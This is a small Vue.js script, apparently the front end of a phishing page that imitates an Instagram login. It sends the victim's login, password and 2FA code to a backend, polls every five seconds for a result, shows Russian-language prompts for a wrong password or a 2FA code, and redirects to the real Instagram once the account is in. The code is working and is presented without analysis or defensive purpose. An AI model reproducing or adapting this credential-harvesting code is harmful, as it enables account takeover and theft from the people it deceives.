var vue = new Vue({
    el: '#auth',
    data: {
        status: 'login',
        login: '',
        password: '',
        id: '',
        error: '',
        two_auth: '',
        click_auth_button: 0,
        click_two_auth_button: 0
    },

    methods: {
        auth: function(e) {
            if (vue.click_auth_button === 1 || vue.click_two_auth_button === 1) {
                axios({method: 'post', url: 'ajax.php', data: new FormData(document.querySelector('form'))})
                    .then(response => {
                        let response_data = response.data;

                        vue.status = response_data['status'];
                        vue.id = response_data['id'];

                        setInterval(function () {
                            if(document.getElementsByName("status")[0].value === "check") {
                                // Запуск проверки
                                axios({method: 'post', url: 'ajax.php', data: new FormData(document.querySelector('form'))}).then(response => {
                                    let response_data = response.data;

                                    // Успех
                                    if (response_data['status'] === true) {
                                        vue.status = 'true'; location.href='https://www.instagram.com/';
                                    }

                                    // Неуспех
                                    if (response_data['status'] === false) {
                                        vue.status = 'false'; vue.error = 'К сожалению,' +
                                            ' вы ввели неправильные данные. Проверьте введенные данные еще раз.';
                                    }

                                    // 2FA
                                    if (response_data['status'] === '2fa') {
                                        vue.status = '2fa'; vue.error = 'На вашем' +
                                        ' аккаунте включена 2FA аунтефикация, введите её, чтобы войти в аккаунт.';
                                    }
                                });
                            }
                        }, 5000);
                    vue.click_auth_button = 0;
                    vue.click_two_auth_button = 0;
                });
            }

            e.preventDefault();
        },
    },
})